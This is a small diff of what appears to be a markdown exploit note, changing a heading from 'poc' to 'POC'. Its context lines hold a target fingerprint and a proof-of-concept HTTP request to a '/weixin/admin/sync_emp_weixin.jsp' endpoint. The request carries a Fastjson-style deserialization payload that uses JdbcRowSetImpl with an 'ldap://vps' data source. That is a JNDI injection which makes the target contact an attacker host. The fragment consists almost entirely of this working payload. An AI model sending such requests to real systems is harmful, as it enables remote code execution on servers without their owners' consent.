@@ -8,7 +8,7 @@
 body="/common/scripts/basic.js"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://vps%22,%22autoCommit%22:true}] HTTP/1.1
